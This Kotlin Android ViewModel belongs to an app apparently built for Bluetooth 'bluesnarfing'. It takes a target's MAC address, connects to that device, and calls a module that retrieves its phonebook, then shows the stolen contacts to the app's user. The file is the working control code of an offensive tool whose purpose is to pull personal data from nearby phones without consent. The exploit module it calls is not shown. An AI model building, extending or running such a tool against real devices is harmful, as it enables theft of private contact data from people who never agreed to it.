package com.hereliesaz.blusnu.ui.bluesnarfing

import android.app.Application
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.hereliesaz.blusnu.data.ActionLogger
import com.hereliesaz.blusnu.data.BluesnarfingModule
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class BluesnarfingViewModel(application: Application) : AndroidViewModel(application) {

    private val _macAddress = MutableStateFlow("")
    val macAddress: StateFlow<String> = _macAddress

    private val _status = MutableStateFlow("")
    val status: StateFlow<String> = _status

    private val _result = MutableStateFlow("")
    val result: StateFlow<String> = _result

    private val bluesnarfingModule = BluesnarfingModule()
    private val bluetoothAdapter: BluetoothAdapter? = (application.getSystemService(BluetoothManager::class.java) as BluetoothManager).adapter

    private var hasPermissions = false

    fun onPermissionsResult(hasPermissions: Boolean) {
        this.hasPermissions = hasPermissions
    }

    fun onMacAddressChanged(macAddress: String) {
        _macAddress.value = macAddress
    }

    fun startAttack() {
        if (!hasPermissions) {
            _status.value = "Bluetooth connect permission is required"
            return
        }

        ActionLogger.log("Bluesnarfing attack started against ${_macAddress.value}.")

        if (bluetoothAdapter == null) {
            _status.value = "Bluetooth is not supported on this device"
            return
        }

        val device = try {
            bluetoothAdapter.getRemoteDevice(_macAddress.value)
        } catch (e: IllegalArgumentException) {
            _status.value = "Invalid MAC address"
            return
        }

        viewModelScope.launch {
            _status.value = "Connecting..."
            val result = withContext(Dispatchers.IO) {
                bluesnarfingModule.getPhonebook(device)
            }
            _status.value = "Finished"
            result.onSuccess {
                _result.value = it
            }.onFailure {
                _result.value = it.message ?: "Unknown error"
            }
        }
    }
}
